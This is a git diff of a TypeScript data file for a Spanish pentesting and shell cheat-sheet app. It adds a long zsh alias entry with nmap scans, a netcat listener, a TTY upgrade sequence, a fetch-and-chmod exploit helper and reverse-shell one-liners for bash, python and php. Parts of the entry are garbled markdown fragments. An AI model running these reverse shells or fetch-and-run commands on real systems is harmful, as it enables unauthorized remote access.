@@ -27,7 +27,7 @@ export interface Command {
 export const commands: Command[] = [
   {
     "id": "24fec7e7-4fc0-80ef-a008-f3585a1afc4e",
-    "title": "Dnsrecon ",
+    "title": "Dnsrecon",
     "command": "dnsrecon -d ejemplo.com -t std",
     "description": "Herramienta para enumerar registros DNS y realizar descubrimiento de subdominios.",
     "category": "Escan",
@@ -71,7 +71,7 @@ export const commands: Command[] = [
       "Documentación"
     ],
     "created_at": "2025-08-14T20:53:00.000Z",
-    "updated_at": "2025-08-18T01:51:00.000Z"
+    "updated_at": "2025-12-28T22:13:00.000Z"
   },
   {
     "id": "253ec7e7-4fc0-80e2-bdb9-e54621c69807",
@@ -179,7 +179,123 @@ export const commands: Command[] = [
       "Documentación"
     ],
     "created_at": "2025-10-10T01:31:00.000Z",
-    "updated_at": "2025-10-10T02:36:00.000Z"
+    "updated_at": "2025-10-12T23:27:00.000Z"
+  },
+  {
+    "id": "2d7ec7e7-4fc0-8054-a7ea-de3d27892a26",
+    "title": "zsh",
+    "command": "sudo nano ~/.zshrc ",
+    "description": "Cheas para configurar zshrc",
+    "category": "zshrc",
+    "tags": [],
+    "examples": [
+      "z <nombre_carpeta>    # Salta a carpeta (recordar frecuencia)\nz -                   # Vuelve a carpeta anterior\nzi                    # Interactivo (FZF)",
+      "bat archivo.py        # Ver archivo con colores\nbat -l man archivo    # Aplicar formato de man\nalias bat='batcat'    # Ya está configurado en tu zshrc",
+      "Ctrl+T                # Buscar archivos en directorio actual\nCtrl+R                # Buscar en historial\nAlt+C                 # Navegar directorios\n\n# Completar con FZF en cualquier comando (usa **)\ncd **<TAB>            # Buscar directorios para cd\nls **<TAB>            # Buscar archivos para listar\ncat **<TAB>           # Buscar archivo para ver contenido\ngrep patrón **<TAB>   # Buscar archivos para grep",
+      "alias ls='lsd'        # ls con colores y iconos\nll                    # ls -l (detalles)\nla                    # ls -A (ocultos)\nl                     # ls -CF (compact)",
+      "..                    # cd ..\n...                   # cd ../..\n....                  # cd ../../..\n.....                 # cd ../../../..",
+      "alias history=\"history 0\"    # Ver todo el historial",
+      "du                    # du -h (tamaño carpetas)\ndf                    # df -h (espacios montar)",
+      "export EDITOR=nvim    # O vim/nano\nexport VISUAL=$EDITOR",
+      "myip                  # Todas las IPs (local + VPN)\nmyip4                 # Solo IPv4 (sin loopback)\nmyip6                 # Solo IPv6\nvpnip                 # IP del tun0 (VPN)",
+      "www                   # Python HTTP.server en puerto 80\nwww8                  # Python HTTP.server en puerto 8000\nphpserver             # PHP server en 0.0.0.0:8000",
+      "ports                 # netstat -tulanp (puertos escuchando)\nlistening             # lsof -i -P (conexiones activas)\nportscan              # nmap -sS -sV -O",
+      "sgrep \"pattern\"       # grep -R -n -H -C 5 (recursivo con contexto)",
+      "cpv                   # rsync -ah --info=progress2 (Copia visible)",
+      "extract archivo.tar.gz     # Extrae automáticamente (.tar.bz2, .zip, .rar, .7z, etc.)",
+      "gs                    # git status\nga                    # git add\ngc \"mensaje\"          # git commit -m \"mensaje\"\ngp                    # git push\ngl                    # git log --oneline --graph --decorate",
+      "mkcd nombre           # mkdir -p nombre && cd nombre",
+      "kp nombre_proceso     # Mata proceso por nombre (sudo kill -9)",
+      "hs \"búsqueda\"         # history | grep \"búsqueda\"",
+      "cp_p archivo1 archivo2   # Copia visual con barra de progreso",
+      "genpass               # 16 caracteres aleatorios (default)\ngenpass 32            # 32 caracteres aleatorios",
+      "listports             # sudo netstat -tulanp | grep LISTEN",
+      "ff \"nombre\"           # find . -type f -iname \"*nombre*\"\nfd \"nombre\"           # find . -type d -iname \"*nombre*\"",
+      "bk archivo.txt        # archivo.txt.bak.YYYYMMDD_HHMMSS",
+      "path                  # Muestra cada ruta en una línea",
+      "transfer archivo      # Sube y devuelve URL pública temporal",
+      "extract archivo       # Detecta formato y extrae (.tar, .zip, .7z, .rar, .gz, etc.)",
+      "nmap-quick <target>   # nmap -sC -sV -oN quick.txt <target>\nnmap-full <target>    # nmap -p- -sC -sV -oN full.txt <target>\nnmap-udp <target>     # sudo nmap -sU -sC -sV -oN udp.txt <target>\nnmap-vuln <target>    # nmap --script vuln -oN vuln.txt <target>",
+      "ctfscan 10.10.10.1    # nmap -sC -sV -oA nmap/10.10.10.1 10.10.10.1\n                      # Crea carpeta nmap/ y guarda 3 formatos (.nmap, .gnmap, .xml)",
+      "listen                # nc -lvnp 443 (default)\nlisten 4444           # nc -lvnp 4444\n                      # Usa rlwrap para historial + edición",
+      "nc 192.168.1.1 4444   # netcat directo (con rlwrap)\nalias nc='rlwrap nc'",
+      "ttyup                 # Muestra guía paso a paso\n                      # 1. python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n                      # 2. Ctrl+Z\n                      # 3. stty raw -echo; fg\n                      # 4. export TERM=xterm\n                      # 5. stty rows 38 columns 116",
+      "echo \"texto\" | clip   # Copiar a clipboard\npaste                 # Pegar desde clipboard",
+      "getexploit https://github.com/...script.py\n                      # wget URL -O nombre && chmod +x nombre",
+      "update                # sudo apt update && full-upgrade -y && autoremove -y",
+      "HISTFILE=~/.zsh_history    # 50,000 líneas guardadas\nHISTSIZE=50000\nSAVEHIST=50000\n\n# Opciones:\n# - hist_expire_dups_first: Borra duplicados primero\n# - hist_ignore_dups: No guarda comandos iguales consecutivos\n# - hist_ignore_space: Ignora comandos que comienzan con espacio\n# - extended_history: Guarda timestamp",
+      "export MANPAGER=\"sh -c 'col -bx | bat -l man -p'\"    # man con colores\nexport FZF_DEFAULT_OPTS=\"--height 40% --layout=reverse --border\"\nexport TERM=xterm-256color\nexport EDITOR=nvim",
+      "# zsh completion automático\n# zstyle options para colors, matcher-list, etc.",
+      "Ctrl+Space  # Acepta sugerencia",
+      "cd /path1      # pushd automático\ncd /path2\npopd           # Vuelve a /path1",
+      "ls=lsd         # Expande a ls --color=auto\nnmap=nmap -sC -sV    # Expande automáticamente",
+      "setopt correct        # ❌ Puede auto-corregir comandos peligrosos",
+      "setopt noclobber      # ✅ Previene sobrescribir archivos con >\nsetopt rm_star_wait   # ✅ Espera 10 segundos antes de rm *\nsetopt hist_ignore_space   # ✅ Ignora comandos con espacio prefix",
+      "Alternar con:",
+      "---\n\n\n## 📝 Crear tus propios aliases/funciones\n\n\n### Alias simple",
+      "### Función personalizada",
+      "---\n\n\n## 🚀 Rápido - Comandos más usados"
+    ],
+    "dangerous": false,
+    "platform": "Unix",
+    "syntax": "z <nombre_carpeta>    # Salta a carpeta (recordar frecuencia)\nz -                   # Vuelve a carpeta anterior\nzi                    # Interactivo (FZF)",
+    "parameters": [
+      {
+        "param": "Ctrl+A",
+        "description": "Inicio de línea",
+        "example": "| `Ctrl+E`"
+      },
+      {
+        "param": "Ctrl+<-",
+        "description": "Palabra anterior",
+        "example": "| `Ctrl+->`"
+      },
+      {
+        "param": "Ctrl+U",
+        "description": "Borrar línea (backward-kill-line)",
+        "example": "| `Ctrl+Supr`"
+      },
+      {
+        "param": "Delete",
+        "description": "Borrar carácter",
+        "example": "### Historial"
+      },
+      {
+        "param": "↑",
+        "description": "Comando anterior (busca en historial)",
+        "example": "| `↓`"
+      },
+      {
+        "param": "Ctrl+R",
+        "description": "Búsqueda incremental en historial",
+        "example": "| `Ctrl+S`"
+      },
+      {
+        "param": "Shift+Tab",
+        "description": "Deshacer última acción (undo)",
+        "example": "| `Ctrl+P`"
+      },
+      {
+        "param": "Ctrl+Space",
+        "description": "Aceptar autosuggestion",
+        "example": "### FZF"
+      },
+      {
+        "param": "Ctrl+T",
+        "description": "Buscar archivo",
+        "example": "| `Ctrl+R`"
+      },
+      {
+        "param": "Alt+C",
+        "description": "Navegar directorios",
+        "example": "| `Tab`"
+      }
+    ],
+    "output": "revshell              # Detecta IP de tun0 y puerto 443 (default)\nrevshell 192.168.1.1  # IP custom, puerto 443\nrevshell 192.168.1.1 4444   # IP y puerto custom\n\n# Output: 3 opciones (bash, python3, php)\n# bash -i >& /dev/tcp/IP/PORT 0>&1\n# python3 -c 'import socket,subprocess,os;s=...'\n# php -r '$sock=fsockopen(\"IP\",PORT);...'",
+    "notes": "",
+    "references": [],
+    "created_at": "2025-12-28T04:22:00.000Z",
+    "updated_at": "2025-12-28T22:50:00.000Z"
   }
 ];
 
@@ -187,7 +303,7 @@ export const commands: Command[] = [
 export const categories = [
   { id: 'all', name: 'Todos los comandos', color: 'gray', count: commands.length },
   ...([...new Set(commands.map(cmd => cmd.category))].sort().map(category => ({
-    id: category.toLowerCase().replace(/s+/g, '-'),
+    id: category.toLowerCase().replace(/\s+/g, '-'),
     name: category,
     color: getCategoryColor(category),
     count: commands.filter(cmd => cmd.category === category).length
